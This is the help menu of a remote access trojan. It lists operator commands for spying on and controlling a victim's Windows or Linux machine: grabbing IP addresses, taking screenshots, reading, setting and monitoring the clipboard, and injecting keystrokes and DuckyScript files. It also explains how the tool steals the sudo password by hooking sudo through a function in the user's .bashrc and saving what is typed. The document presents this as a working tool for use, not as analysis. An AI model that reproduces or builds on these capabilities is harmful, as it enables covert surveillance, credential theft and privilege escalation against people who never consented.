# Help menu

## Commands avalible for Windows and Linux:

### Standalone commands
!ip = Get public and local ip of target  
!screenshot = Take a screenshot of the targets screens  

### Clipboard commands
!clipboard get = Get the targets current clipboard  
!clipboard set = Set the targets clipboard to data of your choice  

### Clipboard Monitor
The clipboard monitor is a background process that monitors for new items copied to the clipboard and sends them to you

!clipboard monitor start = Starts the Clipboard Monitor  
!clipboard monior stop = Stops the Clipboard Monitor  
!clipboard monitor status = See the status of the Clipboard Monitor  

### Keyboard commands

!keyboard write = Use the keyboard to write  
!keyboard press = Press a key with the keyboard  
!keyboard hotkey = Execute a hotkey with the keyboard  

!keyboard duckyscript = Upload a duckyscript file that will get executed on the targets computer. Note that this only supports very simple duckyscript syntax like: REM, STRING, STRINGLN, DELAY, and hotkeys

## Linux commands

### Sudo commands

The sudo commands are used to either obtain the sudo password, run commands with sudo, escelate privileges, etc.  
To obtain the sudo password used for all these the RAT intercepts the sudo command with a function in the users .bashrc file. When the users enters their sudo password its get saved to a file which gets picked up by the RAT.

!sudo password = Obtain the sudo password

